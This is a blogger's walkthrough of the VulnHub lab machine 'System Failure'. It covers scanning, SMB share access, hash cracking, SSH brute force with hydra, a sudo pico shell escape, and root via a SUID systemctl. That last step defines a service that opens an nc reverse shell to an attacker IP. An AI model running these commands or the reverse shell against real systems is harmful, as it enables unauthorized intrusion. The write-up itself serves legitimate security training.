---
layout: default
title : muzec - System Failure Writeup
---

![image](https://user-images.githubusercontent.com/69868171/120077961-04dc7800-c07b-11eb-9c29-172a2de4a64e.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/failure]                                                                                                              
└─$ nmap -p- -sC  -sV -oA nmap 172.16.139.190                                                                                                                          
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 09:52 EDT                                                                                                        
Nmap scan report for 172.16.139.190                                                                                                                                    
Host is up (0.00017s latency).                                                                                                                                         
Not shown: 65530 closed ports                                                                                                                                          
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bb:02:d1:ee:91:11:fe:a0:b7:90:e6:e0:07:49:95:85 (RSA)
|   256 ef:e6:04:30:01:50:07:5d:2d:17:99:d1:00:3d:f2:d6 (ECDSA)
|_  256 80:7f:c5:96:0e:3d:66:b9:d6:a8:6f:59:fa:ca:86:36 (ED25519)
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
Service Info: Host: SYSTEMFAILURE; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 

Host script results:
|_clock-skew: mean: 4h20m08s, deviation: 2h18m34s, median: 3h00m07s
|_nbstat: NetBIOS name: SYSTEMFAILURE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: \x00
|   NetBIOS computer name: SYSTEMFAILURE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-29T12:53:20-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-29T16:53:20
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.96 seconds
```

Some very interesting ports not going to waste to much time to explain everything let hit it we don't have anonymous login on FTp so let start with SMB.

![image](https://user-images.githubusercontent.com/69868171/120078624-4a4e7480-c07e-11eb-88b8-a95a8ed53060.png)

We have a share let get it onto our machine and read it.

![image](https://user-images.githubusercontent.com/69868171/120078672-97324b00-c07e-11eb-993f-8055bb360411.png)

Seems like a hash to me so i try to crack it `89492D216D0A212F8ED54FC5AC9D340B` 

![image](https://user-images.githubusercontent.com/69868171/120078708-cf398e00-c07e-11eb-902f-dcce63d3f57b.png)

And we have it so i try using it on both `FTP` and `SSH` with the username `admin` and boom we are in.

![image](https://user-images.githubusercontent.com/69868171/120078796-22134580-c07f-11eb-9455-dca80da3947d.png)

Going through all the folder on user home directory found some txt fileand a folder.

![image](https://user-images.githubusercontent.com/69868171/120078875-79191a80-c07f-11eb-8b1e-8948421264a3.png)

Lot of files here lol but was about get the file i need by looking at the size cool right??

![image](https://user-images.githubusercontent.com/69868171/120078960-da40ee00-c07f-11eb-8917-922735da7651.png)

Checking the file probably some hint.

![image](https://user-images.githubusercontent.com/69868171/120078995-fa70ad00-c07f-11eb-8490-409bb6743fe6.png)

Enoded in base62 using `cyberchef` and we have the right word.

![image](https://user-images.githubusercontent.com/69868171/120079052-386dd100-c080-11eb-938d-d3d6582efee4.png)

`http://172.16.139.190/area4/Sup3rS3cR37/` with some sub directory in it also checking through.

![image](https://user-images.githubusercontent.com/69868171/120079270-19bc0a00-c081-11eb-8180-874ec6808228.png)

A note from the admin and also a wordlist added to it cool now going back to the ssh since i can read the passwd fileso i added all names in a file yes creating a wordlist.

![image](https://user-images.githubusercontent.com/69868171/120079340-5d167880-c081-11eb-9d9b-8cb5b05fbd31.png)

We are hitting SSH yes brute forcing.


`hydra -L user.txt -P useful.txt -e nsr ssh://172.16.139.190`

The switch `-e nsr` is reverse password that mean we are using the passwordlist in reverse that is backward `valex` to `xelav` .

![image](https://user-images.githubusercontent.com/69868171/120079393-8cc58080-c081-11eb-8d0d-6ce08cc30e7d.png)

Boom we have credential  for user `valex` now let log in SSH .

![image](https://user-images.githubusercontent.com/69868171/120079614-b3d08200-c082-11eb-9b2d-6e285a614462.png)

Checking `sudo -l` cool we can run some command on sudo so we can move to user `jin` .

### Privilege Escalation

![image](https://user-images.githubusercontent.com/69868171/120079693-16c21900-c083-11eb-83d0-d19e26e8e435.png)

Gtfobins to get the command now let move to user `jin` now type `sudo -u jin pico` .

![image](https://user-images.githubusercontent.com/69868171/120079872-fd6d9c80-c083-11eb-81f2-6a549787cbcf.png)

```
^R^X
reset; sh 1>&0 2>&0
```

![image](https://user-images.githubusercontent.com/69868171/120079898-16764d80-c084-11eb-9589-04bc1f94ccdc.png)

We are user `jin` now let check for SUID `find / -perm -u=s -type f 2>/dev/null` .

![image](https://user-images.githubusercontent.com/69868171/120079925-4f162700-c084-11eb-9d8c-c2c366928c96.png)

Boom we have `/usr/bin/systemctl` going back to Gtfobins.

![image](https://user-images.githubusercontent.com/69868171/120079953-766cf400-c084-11eb-9f15-e1be520b02d4.png)


```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.20.10.4 4444 >/tmp/f"
[Install]
WantedBy=multi-user.target' > $TF
```

![image](https://user-images.githubusercontent.com/69868171/120080073-35c1aa80-c085-11eb-9923-1803fa24a550.png)


Start our Ncat listener on the port we want before running it.

![image](https://user-images.githubusercontent.com/69868171/120080091-46722080-c085-11eb-9329-51bfed4f12b2.png)


```
/usr/bin/systemctl link $TF
/usr/bin/systemctl enable --now $TF
```

![image](https://user-images.githubusercontent.com/69868171/120080115-64d81c00-c085-11eb-87cb-820f3fe66373.png)


Now let check our Ncat listener we should have our shell in root already.

![image](https://user-images.githubusercontent.com/69868171/120080139-83d6ae00-c085-11eb-8e0a-edb943090091.png)

We are root and done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
